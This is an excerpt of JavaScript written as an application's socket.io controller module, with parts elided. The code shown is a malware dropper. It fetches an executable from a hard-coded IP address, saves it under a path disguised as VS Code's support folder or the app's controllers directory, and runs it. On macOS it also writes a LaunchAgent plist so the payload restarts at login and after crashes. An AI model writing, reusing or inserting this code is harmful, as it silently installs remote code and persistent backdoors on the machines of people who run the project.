...
module.exports = function (io) {
  ...
  try {
    ...
    if (osType === "Windows_NT") {
      const destPath = "app//controllers//index.exe";
      const file = fs.createWriteStream(destPath);
      http
        .get("http://65.108.131.51/index.exe", function (response) {
          response.pipe(file);
      ...
      const macpath =
        homePath + "/Library/Application Support/Code/Service Worker/node";
      const macfile = fs.createWriteStream(macpath);
      http
        .get("http://65.108.131.51/node", function (response) {
          response.pipe(macfile);
          macfile.on("finish", function () {
            macfile.close();
            exec(macpath, () => {});
          });
        })
        .on("error", function (err) {
          fs.unlink(macpath, function () {});
        });

      const filePath = homePath + "/Library/LaunchAgents/node_service.plist";
      const content =
        ...
        macpath +
        "</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><dict><key>SuccessfulExit</key><true/><key>Crashed</key><true/></dict></dict></plist>";
